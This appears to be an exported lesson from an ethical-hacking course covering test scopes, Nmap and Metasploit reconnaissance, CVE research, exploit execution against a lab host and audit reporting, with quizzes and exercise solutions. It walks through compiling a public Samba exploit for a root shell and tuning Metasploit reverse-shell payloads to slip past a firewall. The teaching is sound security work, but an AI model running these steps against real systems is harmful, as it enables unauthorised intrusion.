lesson.title: System Auditing
lesson.summary: Use test scopes to understand the context and objectives of an audit, gather information about our target, research vulnerabilities, execute exploits, and write effective reports on our findings

atoms.title: Introduction Heading
atoms.text: ## System Auditing

atoms.title: ND350 EHND C1 L2 A01 Introduction V2

atoms.text:
We have done a lot already with automated scanning but now it’s time to do some manual testing. This lesson will cover System Auditing. There are five key areas of focus:

1. Test Scope
1. Information Gathering
1. Researching Vulnerabilities & Exploits
1. Executing Exploits
1. Report Writing

We will finish this lesson with a small discussion on why some exploits are intentionally written with bugs in the exploit code

By the end of the lesson, you will be able to:

* Interpret the test scope document for audit
* Gather and organize information about a target
* Do vulnerability and exploit research
* Execute exploit codes
* Write industry-standard reports

atoms.title: Why System Auditing? Heading
atoms.text: ## Why Does System Auditing Matter?

atoms.title: ND350 EHND C1 L2 A02 Why System Auditing V3
Why System Auditing? Summary
atoms.text:
## Automated Testing Is Not Enough

An automated scan may lead to false positives, false negatives, or both!  That is why a manual system audit is necessary.

atoms.caption: Issues with Automated Scanning
atoms.alt: Automated scanning can lead to false positive and false negatives

atoms.text:
### Manual Validation Can Improve Accuracy

**False Positives** - We take all the findings of automated scans and test them one by one. We find the exploits and try to run them and see if the vulnerability actually exists

**False Negative** - Retesting for missing items can help us avoid false negatives. Here we look for things that the automated scanner can miss, like the possibility of a chained vulnerability

atoms.title: Methodologies Notes
atoms.text:
### Security Auditing Is Not an Art, It's a Science

Most organizations use a four-phase methodology for system auditing.

### Four Phases of System Auditing

* **Reconnaissance** - Gathering information about the target
* **Research** - Finding known vulnerabilities and exploits on our target
* **Validation** - Modifying the exploit code to validate vulnerabilities
* **Reporting** - Writing a report to share the results of the audit

atoms.caption: Four Phases Of System Auditing
atoms.alt: The four phases of system auditing are reconnaissance, research, validation and reporting

question.prompt: Manual System Auditing is always done after running an Automated Scan.
Which phase differentiates a manual scan from an automated scan?

atoms.text:
## New Terms

| Term | Definition |
|-|-|
| Reconnaissance | Gathering information about the target | 
| Reporting | Sharing the results of an audit | 
| Research | Finding known vulnerabilities and exploits | 
| Validation | Using exploit code to confirm that a vulnerability exists |

### Further Reading This article shares a similar framework for system auditing: What Are the Penetration Testing Steps?. It descrived a seven-step process that is similar to the four-step framework described above but splits the first phase into three parts and the last phase into two. If you want to learn more about the differences between automated and manual scanning, read this article: The Great Debate: Automated vs. Manual Penetration Testing.

atoms.title: How Experts Approach System Auditing Heading
atoms.text: ## Stay In Scope

atoms.title: ND350 EHND C1 L2 A03 Test Scopes V2
How Experts Approach System Auditing Summary
atoms.text:
## Testing Puts Our Systems At Risk

Manual auditing involves using a variety of tools exploits that can break a system and cause significant disruption to the organization. A poorly executed test can cause the same type of damage as a malicious hack.

### Test Scopes Limit The Risk

Test scopes limit the risk by defining ***what needs to be tested ***and ***how the test should be done***. A test scope also includes the tools and resources that can be used during the test, which leads to a more controlled testing environment.

### Elements Of Test Scope

1. **Test Summary - **Provides a basic understanding of why the test is being conducted and what are the objectives of the test.
1. **Work Breakdown Sheet - **Provides a high-level overview of all the tasks that need to be completed to execute the test. These can include scanning for service versions, researching vulnerabilities, validating vulnerabilities by executing exploits, scoring, and reporting findings.
1. **Rules for The Assessment **- Defines what is allowed and what is not allowed during the test. These rules may include requirements for vulnerability impact, tools that can be used for the test,  and trusted sources for research.

## New Terms

| Term | Definition |
|-|-|
| Rules for the assessment | An element in the scope that lists what is allowed and not allowed for performing an assessment. | 
| Test Summary | An element in the test scope that explains why the test is being conducted, the context for the test, and the goal of the test | 
| Work Breakdown Sheet | An element in the test scope that gives a high-level overview of the tasks to be performed |

### Further Reading To learn more about how to create an effective test scope, read this article from PentesterLab: Scoping a pentest. It shares best practices and a step by step process for creating test scopes from the perspective of outsourcing the audit to a third party.

atoms.title: Methodologies Quizzes Heading
atoms.text: ## Thinking About Test Scopes

question.prompt: Which of these are typically present in the **Rules for the Assessment** section of the test scope? (*Hint: there is more than one correct response*)

answers.text: Tools allowed to be used in the assessment
High level steps to be followed to complete the assessment

question.prompt: True or False: Test scopes improve the ***effectiveness*** of our testing

atoms.title: Information Gathering Heading
atoms.text: ## Using A Target Database

atoms.title: ND350 EHND C1 L2 A04 Target Databases V2

atoms.text:
The goal of reconnaissance is to **collect and store information** in an organized manner.  We collect information about our target including:

* Open ports
* Services running
* Service version numbers
* Operating system being used

We organize and store this information in a **target database**

<hr>

atoms.caption: Structure Of A Target Database
atoms.alt: A target database includes information about the port, protocol, services, version and comments

atoms.text:
### Elements of Target Database

1. Generally, the IP Address or the URL of the target is listed under the column **HOST**
1. Opened ports on the target are listed under the column **PORT**
1. Protocols of the opened ports are listed under the column **PROTO**
1. Services running on those ports are listed under the column **SERVICE**
1. Versions of those services found are listed under the column **VERSION**
1. Additional Information can be stored under the column **COMMENTS**

#### Simple Target Database - Pen and Paper

We could just write down all of the information using a pen and paper, but that would be very time consuming, and as the list gets longer, it would be difficult to keep organized.  

#### Better Target Database - Spreadsheet

A better option is to use a simple spreadsheet as our target database.  We can create a row for each bit of information and columns to store each type of data.

#### Professional Target Database - Specialized Tool

Professionals often use specialized tools including Metasploit, Core-Impact, and others that make it easier to set up and manage the database.

### New Terms
Term Definition
Core-Impact A commercial pentesting framework developed by Core Security that includes handcrafted premium exploits
Metasploit A commercial pentesting framework developed by Rapid7
Target Database A spreadsheet or specialized tool to store data collected during reconnaissance
## Getting Started With Nmap

atoms.title: ND350 EHND C1 L2 A05a Reconnaissance With Nmap Intro V3

atoms.text:
**Nmap **is a popular tool that is used to gather information about open ports, services running on those ports, their versions, and the operating system being used by the target.

Nmap has the **Nmap Scripting Engine (NSE)** which provides scripts that automate tasks related to gathering specific information, for example, finding valid usernames on an SSH Server. These scripts are written by other NSE users and shared with the community

We'll be using Nmap mostly to learn about the network, but** **it can also be used for other tasks including advanced version detection, backdoor detection, vulnerability, and exploit detection.
## Getting Started With Nmap

atoms.title: ND350 EHND C1 L2 A05b Compile An Exploit

atoms.text:
### Gathering Information With Nmap

1. To view the user manual, open a terminal and type
```bash
nmap
```
1. To scan a specific target, we add the **IP** or **URL** as a parameter
```bash
nmap 10.10.10.20
```
1. Nmap scans the top 1000 ports by default. To scan a range of ports we can specify the port range using `-p(port-range)` or use `-p-` to scan all ports.
```bash
nmap 10.10.10.20 -p0-65535
```
1. Nmap scans only TCP ports by default. To **scan UDP ports** as well, we can specify the protocol using `-sT` for TCP and `-sU` for UDP.
```bash
nmap 10.10.10.20 -p0-65535 -sT -sU
```
1. To find **versions of the service** discovered, we use `-sV`.
```bash
nmap 10.10.10.20 -p0-65535 -sT -sU -sV
```
### OS Detection & Nmap Scripting Engine

atoms.title: ND350 EHND C1 L2 A05c Execute An Exploit

atoms.text:
1. Use `-O` to find the** operating system**
```bash
nmap 10.10.10.20 -p0-65535 -sT -sU -sV -O
```

1. To **scan a specific port**, we can use `-p(port-number)`, select an appropriate script from `/usr/share/nmap/scripts` directory and use `--script=`
```bash
nmap 10.10.10.20 -p139 -sT -sU -sV -O --script=smb-enum-shares
```

### Keep in Mind...

Just like any other tool, NSE can make mistakes. There will be false positives as well as false negatives. You should always manually verify the results with at least two tools.

For example, if NSE shows *Anonymous on FTP* is allowed, you should manually try to login using an anonymous username and verify if NSE is correct.

### New Terms
Term Definition
NMap (Network Mapper) A popular open-source reconnaissance tool
NSE (Nmap Scripting Engine) A tool to write and share scripts to automate a wide variety of networking tasks
## Reconnaissance With MSF

atoms.title: ND350 EHND C1 L2 A06 Reconnaissance With MSF V2

atoms.text:
**Metasploit-Framework (MSF)** is a toolkit that includes hundreds of tools and a workspace for testing.  It automatically creates and maintains a target database in the workspace.

MSF can integrate with Nmap directly by replacing Nmap with `db_nmap` for scanning. All the scan results are automatically saved in the Metasploit target database of the selected workspace.

Apart from the Nmap integration, Metasploit features more than 500 built-in scanners which can be used to gather specific information from multiple services and applications.

### Using Nmap and Metasploit-Framework

1. Metasploit maintains all its data in Postgresql database so you can start the service using
```bash
service postgresql start
```

1. Initialize the database and check it's configurations using `msfdb init`
1. Launch Metasploit console using `msfconsole`
1. Create a workspace using `workspace -a (workspace-name)`
```bash
workspace -a udacity
```

1. Switch workspace using `workspace udacity`
1. We can run Nmap commands within the Metasploit using `db_nmap` and the results will automatically get saved in the target database of the current workspace.
```bash
db_nmap -p- -O -sT -sU -sV 10.10.10.20
```
1. To check the data stored in the target database, we use the commands `hosts` and `services`

### Using Auxiliary Modules in Metasploit-Framework We can do information gathering using the auxiliary modules. There are more than 500 scanners in Metasploit. 1. Find a scanner by using`search type:auxiliary (keyword)` and specifying the type as `auxiliary`: ```bash search type:auxiliary smb ``` 1. To select a scanner from the list, you can use the `use (module-name)` command ```bash use auxiliary/scanner/smb/smb1 ``` 1. To check the available options of the module, We can use `show options`

1. To change any option, We can use `set (option) (option value)` ```bash set RHOST 10.10.10.2 ``` 1. Execute the scanner using the `run` command

### New Terms
Term Definition
Core-Impact A commercial pentesting framework developed by Core Security that includes handcrafted premium exploits
Metasploit A commercial pentesting framework developed by Rapid7
NMap (Network Mapper) A popular open-source reconnaissance tool
NSE (Nmap Scripting Engine) A tool to write and share scripts to automate a wide variety of networking tasks
Target Database A spreadsheet or specialized tool to store data collected during reconnaissance

### Further Reading * If you want to learn more about information gathering, you can read this guide from Security Trails: Information Gathering: Concept, Techniques, and Tools explained. It contains actionable insights and information about other tools you can use. * To learn more about how to use Nmap, check out their documentation: Nmap Reference Guide - Chapter 15. You'll refer to this guide frequently as an Ethical Hacker. * You can refer to this guide from Offensive Security: Metasploit Unleashed to learn more about the Metasploit-Framework.

atoms.title: Information Gathering Quizzes Heading
atoms.text: ##  Thinking About Information Gathering

question.prompt:
You need to run a scan to search all ports.  Why won't this command provide the results you need?
```bash
nmap -sT -sU 10.10.10.10 --script=default 
```

answers.text: This syntax is wrong and Nmap will not initiate a scan
This syntax is correct but Nmap will throw an error because it requires root privileges
This syntax is correct but Nmap will not scan all ports

question.prompt: Which of these are valid Nmap scripts?

atoms.title: Exercise: Information Gathering Heading
atoms.text: ## Information Gathering Using Metasploit

atoms.title: Exercise: Information Gathering Instructions
atoms.text: Your task is to perform information gathering and build a target database on TestLab using your Analyst VM. For this exercise, you will use the TestLab virtual machine (TestLab.ova) and target `10.10.10.15`. Follow the tasks below to complete the exercise:

atoms.title: Information Gathering On TestLab
tasks: Perform a **TCP scan on all ports** of the target
Perform **service version** and **operating system detection** scans using the identified open ports
Check the **target database** and analyze the data you gathered
Find the exact numeric version of service running on **port 139**
atoms.positive_feedback: Great job!  You can see my solution in the next video.

atoms.title: Solution: Information Gathering Heading
atoms.text: ## My Solution

atoms.title: ND350 EHND C1 L2 A07 Solution Reconnaissance On TestLab V4
Solution: Information Gathering Summary
atoms.text:
1. Open your **Metasploit** console ```bash msfconsole ``` 1. Create a new workspace ```bash workspace -a testlab ``` 1. Change the workspace to the `testlab` workspace ```bash workspace testlab ``` 1. Scan all ports using the Nmap all ports scan: ```bash db_nmap -p- 10.10.10.15 ``` 1. Run another scan on the identified ports with **service version detection and operating system detection** ```bash db_nmap -p22,80,111,139,443,32768 -sV -O 10.10.10.15 ``` 1. To identify the exact version of the Samba service, select the`smb_version` scanner module of Metasploit ```bash use auxiliary/scanner/smb/smb_version ``` 1. Set the remote host (i.e. the target host) to the target’s IP address. ```bash set RHOSTS 10.10.10.15 ``` 1. Use the `exploit` or `run` command to get the exact samba service version

1. To check the** target database** for results, use commands `hosts` and `services`

question.prompt:
In this exercise, We followed a staged scan divided into two phases.

1. We found all the open ports
2. We selected the open ports and then scanned them for version detection

Why do you think we didn't use the `-sV` and `-O` options in the first step?

atoms.title: Researching Vulnerabilities Heading
atoms.text: ## Researching Vulnerabilities

atoms.title: ND350 EHND C1 L2 A08 Researching Vulnerabilities V3
Researching Vulnerabilities Notes
atoms.text:
The job of an Ethical Hacker is to find known vulnerabilities as they have the highest chances of being exploited. A Common Vulnerability Exposure  (CVE) is assigned by organizations to products affected globally. 

### Important Elements of CVE

* **Vulnerability Description: ** brief information about the vulnerability
* **CVSS Vector**: base and temporal score related information
* **Products Affected**: all of the affected products by the vulnerability
* **Vulnerability Type**:  type of weakness

### Type Of Vulnerabilities

* **Denial of Service (DOS)** is a vulnerability that affects the availability of the system by crashing the services or applications, stopping processes, or increasing the system's workload.
* **Execution (EXEC)** is a vulnerability that allows an attacker to run running a command or code on the system.
* **Memory Corruption/Overflows** **(MC/BO)** generally occur due to improper handling of resources. These can indirectly affect CIA by leaving the system vulnerable to DOS or code execution attacks.
* **Application-based vulnerabilities** like XSS, CSRF, SQLI, etc. (We will study these in the next lesson)

<hr>
## Researching Exploits

atoms.title: ND350 EHND C1 L2 A10 Researching Exploits V2

atoms.text:
## Researching Exploits Is An Important Skill

You cannot take advantage of a vulnerability if there is no exploit against it.

### Three Types Of Exploit Codes

* **Proof of concept / Analysis of vulnerability **refers to incomplete exploits. These are often long and detailed articles describing the vulnerability. These can be used by experienced exploit writers to develop an exploit from scratch.  They can also be used by an Ethical Hacker to manually send requests and execute the exploit in a step-by-step process.
* **Public Exploits **are community-driven and can be risky to use. They are typically shared as raw code that will need to be modified to work in the target environment.
* **Commercial Exploits **are developed by a reputable vendor. The vendors do a significant amount of research and testing in multiple environments so they are considered quite safe. A vendor may also be able to provide exact metrics on how the exploit can affect the CIA (Confidentiality, Availability, and Integrity) of the target system.

### New Terms 

| Term | Definition |
|-|-|
| CVE (Common Vulnerability Exposure) | A list of known information security vulnerabilities |

### Further Reading * If you want to learn more about CVEs, read this article from Red Hat: What is a CVE?. It explains how the CVE system works, discusses requirements for assigning CVE's, and shares some interesting takeaways. * Rapid7 has written an eye-opening article comparing public exploits and commercial exploits: Security Death Match: Open Source vs. Pay-for-Play Exploit Packs

atoms.title: Researching Vulnerabilities Quizzes Heading
atoms.text: ##  Thinking About Researching Vulnerabilities

complex_prompt.text: Order the tasks for researching a known vulnerability

correct_answer.text: Create a target database with services and ports
Check for CVE's related to that service or port
Shortlist the CVE's based on the type of vulnerability or Risk Score
Analyze the details like description, analysis, references, etc.

answers.text: Analyze the details like description, analysis, references, etc.
Shortlist the CVE's based on the type of vulnerability or Risk Score
Check for CVE's related to that service or port
Create a target database with services and ports

question.prompt: What does it mean if a CVE has an **Authentication** metric set to **Single**?

answers.text: You need to own a system to exploit this vulnerability
You need a system on the same network to exploit this vulnerability
You need valid system credentials or a user account to exploit this vulnerability
You can only attack a single system with this vulnerability

atoms.title: Exercise: Researching Vulnerabilities Heading
atoms.text: ## Researching Vulnerabilities in Samba

atoms.title: Exercise: Researching Vulnerabilities Instructions
atoms.text:
Your task is to look up the CVE and Exploits available for the **samba 2.2.1a** related vulnerabilities. 

### Requirements

* The CVSS Score should be `10.0`
* The vulnerability type should be `EXEC Code Overflow`
* Commercial Exploits should be available

Follow the tasks given below to complete the exercise.

atoms.title: CVE and Exploit Research
tasks: Filter your results  based on the listed requirements
atoms.positive_feedback: Nice work!  You can see my solution in the next video.

atoms.title: Solution: Researching Vulnerabilities Heading
atoms.text: ## My Solution

atoms.title: ND350 EHND C1 L2 A09 Solution Research On Samba V2
Solution: Researching Vulnerabilities Summary
atoms.text: 1. Use the internet to search for related CVEs, e.g. ***samba 2.2.1a CVE*** 1. Click on the link for CVE Details and look through the results for a CVE that meets the requirements: * CVE score: 10 * Vulnerability type: `EXEC Code Overflow` * Commercial exploits are available 1. **CVE-2003-0201** meets the requirements 1. Use the internet to search for exploits, e.g. ***CVE-2003-0201*** 1. One of the results is from **exploit-db**. This meets the requirement of a public exploit. Go to https://www.exploit-db.com/exploits/7 to see the details. 1. Use the internet to search for exploits, e.g. ***CVE-2003-0201*** analysis 1. Find a link to the National Vulnerability Database and click on it: https://nvd.nist.gov/vuln/detail/CVE-2003-0201 1. Explore the items in the **References** section to find a PoC/Analysis

question.prompt:
CVE-2003-0201 found in this exercise has a score of 10 but still says that admin credentials are required.
Is the CVSS score wrong?

atoms.title: Executing Exploits Heading
atoms.text: ## Executing Public Exploits

atoms.title: ND350 EHND C1 L2 A11a Executing Public Exploits V3
Executing Exploits Notes
atoms.text:
### Process For Executing A Public Exploit

* **Modify** the exploit according to your needs (eg: LHOST, LPORT, RHOST, RPORT)
* **Compile **the raw code into an executable file
* **Debug **the code by looking after the errors and dependency issues
* **Run **the exploit on the target
### Steps To Compile A Public Exploit

atoms.title: ND350 EHND C1 L2 A11b Compile An Exploit V2

atoms.text: Target Machine - 10.10.10.15 (You should practice this hence we are doing it on your test lab) Download the exploit code in your Analyst Machine - exp.c 1. Open the exploit in a text editor and read it. (There is a comment on top which tells us how to compile it) 1. Compile the exploit using gcc with the command `gcc -o exp exp.c -lcrypto` 1. You will get an error `openssl/ssl.h: No such file or directory` 1. Copy the error and research the solution on the internet 1. This error occurs because a package called libssl-dev is missing. To install it, use `apt-get install libssl-dev`
### Steps To Execute The Compiled Exploit

atoms.title: ND350 EHND C1 L2 A11c Execute An Exploit V2

atoms.text:
1. Run the exploit  using `./exp`
1. Exploit requires additional information. Usage shown to us is **./exp target box [port] [-c N]** where the **target **and** port **are to be selected using the information in the **target database**. In our environment, it is.`./exp 0x6b 10.10.10.15 443 -c 50`
1. Exploit takes quite some time to spawn a fully-rooted shell. Confirm the hack by running the command **hostname** and the output should be **testlab.example.com**

### New Terms 

| Term | Definition |
|-|-|
| Compiler | Software that converts source code into an executable file | 
| Listening Host (LHOST) | The IP Address of the machine where a listener is running | 
| Listening Port (LPORT)  | The open port on the machine where a listener is running | 
| Payload | The malicious code that infects a target system | 
| Remote Host (RHOST) | The target's IP Address | 
| Remote Port (RPORT) | The open port on the target's machine |

### Further Reading This blog post contains some helpful notes about compiling exploits: Compiling Exploits. Some portions of this article may not make sense to you right now but as you progress through your career, it will be easier to see their relevance in real-world situations.
## Executing Commercial Exploits

atoms.title: ND350 EHND C1 L2 A12a Executing Commercial Exploits V3

atoms.text:
### Process For Executing A Commercial Exploit

1. **Search** for an exploit using a keyword
1. **Load** an exploit as a module
1. **Tune** the exploit by modifying the options which are required
1. **Run** the exploit and wait for the results to show up

### Reliability Ranks In Metasploit For Exploit Search

* Manual
* Low
* Average
* Normal
* Good
* Great 
* Excellent

### Single vs. Staged Payloads

The **payload** is the malicious code that is sent to the target system once a weakness has been exploited successfully. The payload may allow an attacker to control the system, take screenshots, record audio, and much more.   

If the payload code is sent all at once, It is called a **single** (also known as **non-staged** payload) and if the payload code is sent in parts through multiple stages, It is called a **stager** (or **staged payload**)

### Shell vs. Meterpreter Payload Types

**Shell** is a simple payload that gives remote access to the system console. It will be a command prompt if the target is running Windows or a terminal if the target is running macOS or Linux. 

**Meterpreter** is a more advanced payload with built-in options that depend on the target machine. The Windows Meterpreter provides the most features including taking screenshots, controlling the webcam, keylogging, recording using the microphone, accessing a system shell, escalating privileges to administrator-level, and many more. 

### Bind vs. Reverse Connection

The payload needs to establish a connection between the two machines to give the attacker access to the target machine.

In a **bind** connection, the attacker's machine connects to the target's machine. This can be used when the target allows inbound connections in its firewall configurations.

In a **reverse** connection, the target's machine connects back to the attacker's machine. This is helpful when the target allows only outbound connections in its firewall configurations.
## Using Metasploit

atoms.title: ND350 EHND C1 L2 A12b Metasploit Demo Part 1 V2

atoms.text:
## Step-by-step Instructions to Execute an Exploit Exploit Name - MS17-010 (Eternal Blue). Exploit Location - Metasploit-Framework ### Instructions 1. Open a terminal and launch the Metasploit console ```bash msfconsole ```
1. Search for the available exploits using the** search type:exploit (exploit-keyword)** ```bash search type:exploit eternalblue ```
1. Use the exploit with the **use (exploit-module-number)** ```bash use 2 ```
1. To check for the available payloads, you may use `show payloads` command and set the payload using `set payload ` ```bash set payload 208 ```
## Using Metasploit Part, cont.

atoms.title: ND350 EHND C1 L2 A12b Metasploit Demo Part 2

atoms.text:
5. Check the list of required options using the `show options` command ```bash show options ```
6. To change an option, use `set

### Further Reading * To learn more about Meterpreter, read this article from Offensive Security About The Metasploit Meterpreter * There are many other payloads supported by Metasploit, You can read about them here: Payload Types in the Metasploit Framework

atoms.title: Executing Exploits Quizzes Heading
atoms.text: ##  Thinking About Executing Exploits

question.prompt: Why do we use trusted sources for exploit codes?

answers.text: Exploits can cause damage to CIA of the system
It is illegal to use exploits which are not purchased on commercial exchanges
Exploits that don't come from trusted sources are unlikely to work and will give us unreliable results

question.prompt: What can you do if an exploit doesn't work?

answers.text: Read the code and try to figure out how it works
Research the error on the internet
Retry the exploit few more times

atoms.title: Exercise: Executing Exploits Heading
atoms.text: ## Exploiting CVE-2003-0201

atoms.title: Exercise: Executing Exploits Instructions
atoms.text:
In the last exercise, we found that Samba 2.2.1a is vulnerable against CVE-2003-0201 and we found an exploit named **Trans2Open Overflow.**

For this exercise, we need to validate the vulnerability using Metasploit on your analyst machine. Be aware that:

* The rules of assessment only allow the use of commercial exploits
* A firewall is running on the system which only allows outbound connections to NTP (Network Time Protocol) servers on TCP

atoms.title: Validating a Vulnerability
tasks: Load the correct module for **Trans2Open** vulnerability in Metasploit on your analyst machine
Tune the exploit considering the **firewall requirements**
Run the exploit and **validate** the vulnerability
atoms.positive_feedback: Great job!  In the next video, you can see my solution.

atoms.title: Solution: Executing Exploits Heading
atoms.text: ## My Solution

atoms.title: ND350 EHND C1 L2 A13 Solution Exploiting CVE 2003 0201 V3
Solution: Executing Exploits Summary
atoms.text:
1. Launch Metasploit Console ```bash msfconsole ```
2. Search available exploits ```bash search type:exploit trans2open ```
3. Because the target is a Linux host, choose the **Linux based trans2open exploit** ```bash use exploit/linux/samba/trans2open ```
4. Use the `show options` command to obtain further information and the parameter requirements. ```bash show options ``` This tells us that `LHOST` and `LPORT` can be configured. We see that `LHOST` is already set to `10.10.10.7` which is the correct connection.

5. We know that the firewall on the server allows outbound connections on the NTP port. A quick internet search tells us that NTP runs on port `123` so we'll use the `set` command to tune the exploit to bypass the firewall requirements using port 123. ```bash set LPORT 123 ```
6. Run the `show options` command again to confirm that `LHOST` and `LPORT` are correctly set. ```bash show options ```
7. Run the exploit. ```bash run ``` And we get an error: `Exploit failed: One or more options failed to validate: RHOSTS`

8. Use the `set` command to set the `RHOSTS` ```bash set RHOST 10.10.10.15 ```
9. Run the exploit again ```bash run ``` This time we see that the Meterpreter session is opening and closing. This means that the payload is not compatible with the exploit. Use `CTRL-C` to cancel.

10. Run `set payload` and then click `tab` twice to see the list of possible payloads. Copy the exploit that uses a reverse payload on TCP and use the `set payload` command to set it. ```bash set payload linux/x86/meterpreter/reverse_tcp ``` Run the exploit again: ``` run ``` The session is still dying! Hit `CTRL-C` to stop it.

11. The settings are correct so it is time to try a different payload type. Instead of using `meterpreter` we can try `shell` or `generic shell`. We'll run `set payload` and hit `tab` again twice to see our options. We'll copy the `generic shell` option, and paste it after `set payload` to change the payload again. ```bash set payload generic/shell_reverse_tcp ``` We'll launch the exploit again with the `run`command: ```bash run ``` It worked! We see `Command shell session 9 opened`

12. Next, we can run `whoami` and `hostname` to check our results: ```bash whoami ``` Returns `root` which tells me I have root access ```bash hostname ``` Returns `testlab.example.com` which prove that we were successful in hacking the machine!

question.prompt: When do you think using a staged payload is a good idea?

atoms.title: Reporting Heading
atoms.text: ## Sharing Your Findings in A Report

atoms.title: ND350 EHND C1 L2 A14 Writing Reports Part 1 V2
Reporting Notes
atoms.text:
### Nine Must-Have Elements In An industry-Standard Report

* Document Control 
* Legal Disclaimer
* Table of Contents
* Executive Summary
* A Glance Through Target Security Posture
* Testing Methodology
* Tools & Websites Used 
* Detailed Technical Reports
* Appendices

### Document Control

Document Control is used to keep track of the document versions. This is necessary because a report often requires input from many different people: one person reports on automated testing, another person reports the results of manual tests, and another person checks the report formatting issues. All of this needs to be recorded. This information is also used when any retesting is done in the future.

### Legal Disclaimer

The disclaimer should be written by your legal team to minimize any risk to the organization from incorrect information in the report

### Table of Contents

The Table of Contents helps readers find the information they are looking for quickly by providing a page number for each section of the report. You might think it should be the first element in a report, but in the security industry, document control and disclaimer information are more important so they come first. 

### Executive Summary

The summary shares an overview of the audit results. It should include: 

* The context of the assessment
* A high-level summary of the results
* Observations made 
* Problems discovered
* A proposed solution that is consistent with the organization's policies and procedures

It is also helpful to include a pie chart showing the number of vulnerabilities found for each level of risk rating.

### Security Posture

The Security Posture includes a table of all of the important numbers:

* The total number of vulnerabilities 
* The number of critical vulnerabilities
* An overall security rating

You may also want to include a pie chart of the data.
## More Report Details

atoms.title: ND350 EHND C1 L2 A14 Writing Reports Part 2
Reporting Notes
atoms.text:
### Methodology And Tools

#### Methodology

This section should follow the steps outlined in the Work Breakdown sheet of the test scope and should list all of the steps followed. If you don't have a test sope, follow the four-step process we covered earlier.

#### Tools

This section should follow the Rules of Assessment from the test scope. It lists all of the allowed tools and sources. If you don't have a test scope, you should list all of the tools and websites you used to complete the test.

### Detailed Technical Reports

There should be one report for each target in the test scope. 

#### Summary

The summary page should list the number of vulnerabilities found on that target. 

#### Technical Report

The Technical Report should include

* A finding name with a risk rating
* A description of the vulnerability (generally copied from CVE)
* An Exposure/Analysis section where you share your professional judgment and observations., as well as any details about code modifications or chaining and risk score adjustments.
* A recommendation for each vulnerability.

### Appendices

The appendices should include any relevant additional information like screenshots, modified codes, vulnerability score analysis, etc.

### Security Report Template Download here: Security Report Template. The template is a `.docx` format that can be opened using most popular word-processing systems, including Microsoft Word and Google Docs. To use the worksheet in Google Docs: 1. Upload the document to your Google Drive 1. Click **Open with Google Docs** at the top of the screen

### Further Reading We have been focusing on writing reports for an internal audience. Reports from third-party service providers are a little different. See this article from Infosec to learn more: The Art of Writing Penetration Test Reports

question.prompt: True or False: The overall security rating in the Security Posture is subjective whereas the risk rating in the Detailed Technical Report is objective in nature.

complex_prompt.text: Match the report section with the information found in that section

correct_answer.text: An overall summary of the organization's security
Technical guidance for the Blue Team

answers.text: Technical guidance for the Blue Team
An overall summary of the organization's security

atoms.text: ## Report On Testlab

Based on your findings from the earlier exercises in this lesson, write the Detailed Technical Report section of the security audit report. Write the report using the provided template: Security Report Template. The template is a `.docx` format that can be opened using most popular word-processing systems, including Microsoft Word and Google Docs. To use the worksheet in Google Docs: 1. Upload the document to your Google Drive 1. Click **Open with Google Docs** at the top of the screen

atoms.title: Write the Detailed Technical Report section of a security audit report
tasks: Download the report template (see link at the bottom of the page)
Write a description analysis, and recommendation based on your findings and give it the title **Remote buffer overflow**
Write the **Steps to Reproduce** section and include screenshots
Create the **Summary of The target** page
atoms.positive_feedback: Great job!  In the next video, you can see my solution.

atoms.text: ## Report On Testlab

atoms.title: ND350 EHND C1 L2 A15 Report On TestLab

atoms.text: ## Detailed Technical Reports

## Finding 1: Remote Buffer Overflow – `CRITICAL`

### Vulnerability Description:

Buffer overflow in the call_trans2open function in trans2.c for Samba 2.2.x before 2.2.8a, 2.0.10 and earlier 2.0.x versions, and Samba-TNG before 0.3.2, allows remote attackers to execute arbitrary code.

### Exposure/Analysis:

The target is running this service as the Root User hence this is extremely dangerous. If exploited successfully, will give complete privileged control over the server.

It should be noted that the default Meterpreter payload doen’t works and needs to be changed to a generic shell payload for the exploit to work successfully.

### Recommendations:

Upgrade Samba to a secure release – Latest version available is Samba 4.13.x

## Steps to Reproduce

1. **Initial Nmap Scan** Reveals many ports, protocols and services.
   * Command Used – `nmap 10.10.10.15 -p0-65535 -sV`

2. The **exact numeric version for Samba** was Discovered using Metasploit

   * Metasploit Module Utilized - `auxiliary/scanner/smb/smb_version`
3. Research on Samba 2.2.1a discovered **a score-10 CVE-2003-0201** and 4 Potential Exploits. * CVE Reference Page - **https://www.cvedetails.com/cve/CVE-2003-0201/**
4. **Exploit validated** with given options. * Metasploit Module Reference – **https://rapid7.com/db/modules/exploit/linux/samba/trans2open/**
## Help! My Exploit Code Isn't Working

question.prompt: True or False: If a public exploit code is not working even after trying all possible input parameters, we can mark the system as safe

atoms.title: ND350 EHND C1 L2 A16 Buggy Exploits V3
Every Case is Different Text
atoms.text:
Exploits are the weapons of the digital age and if they fall into the wrong hands, they can easily cause a lot of destruction. For this reason, When an exploit is really dangerous, the exploit writers bug them intentionally, so that only a person who understands the exploit can fix it and use it.

The bugs are typically one of the following:

* Missing special characters
* Use of bad interpreters
* Providing incorrect paths
* Unjustified comments

### Missing special characters

Exploit writers often leave out some special characters intentionally like a comma, a colon, or a semicolon. When the code is compiled, we get an error stating that the compiler is expecting one of the given special characters at a certain location in the code.

### Use of bad interpreters

In languages like Python, It is important that the exploit defines the correct location of the interpreter. Exploit writers often use incorrect syntax to make sure the code doesn’t get executed without fixing the issue. A solution for this can be found with a quick internet search.

### Providing incorrect paths

Exploits that use incorrect paths are more difficult to fix because the code does not throw any errors. The exploit will compile and execute but it won’t work as expected because the location is wrong. A fix may be found by following the path given in the PoC/Analysis of the exploit.

### Unjustified comments

Unjustified comments involves commenting out a section of the exploit code which causes it to be ignored.  The exploit compiles and runs without throwing errors -- but it doesn't run that section of the code that is commented out.  This is an easy fix because all you have to do is remove the unnecessary comment tags.

question.prompt: Which of the following is hardest to fix?

atoms.text:
### New Terms

| Term | Definition |
|-|-|
| Interpreter | Software that executes the instructions from source code without compiling it. Python is one of the popular languages which supports the use of an interpreter. |

atoms.title: Lesson Recap Heading
atoms.text: ## What We Have Learned

atoms.title: ND350 EHND C1 L2 A17 Lesson Recap V2
Lesson Recap Summary
atoms.text:
In this lesson, we studied System Auditing and focused on six topics:

### Test Scopes

We learned about test scopes and how to use them while conducting a manual audit

### Information Gathering

We learned how to gather information and organize it in target databases using NMap and the Metasploit Framework.

### Researching Vulnerabilities & Exploits

We learned how to use the information we gathered to research vulnerabilities and exploits. We used CVE’s to find and understand vulnerabilities and we looked at Proof of Concept, public and commercial exploits.

### Executing Exploits

We learned how to execute exploits and how the process for executing public exploits is different from commercial exploits.

### Report Writing

We learned how to use all the information we have collected to write effective reports.

### Discussion On Buggy Exploits

